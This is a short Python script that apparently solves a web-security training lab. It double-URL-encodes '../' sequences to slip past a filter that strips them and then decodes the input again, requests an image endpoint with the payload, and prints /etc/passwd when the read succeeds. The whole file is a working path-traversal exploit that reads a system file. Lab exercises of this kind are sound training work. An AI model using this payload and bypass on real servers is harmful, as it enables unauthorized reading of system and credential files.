import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# server decodes input once, strips ../ sequences, then the app decodes again
# double-encode so it survives the first decode + strip:
#   %252e%252e%252f -> (first decode) -> %2e%2e%2f -> (strip: no match) -> (second decode) -> ../
traversal = "%252e%252e%252f" * 3 + "etc/passwd"

# pass the payload directly in the URL to avoid requests encoding it again
resp = lab.session.get(lab.url(f"/image?filename={traversal}"))

if resp.status_code == 200 and "root:" in resp.text:
    lab.success("Got /etc/passwd:")
    print(resp.text)
else:
    lab.fail(f"Traversal failed (status {resp.status_code})")

lab.check_solved()
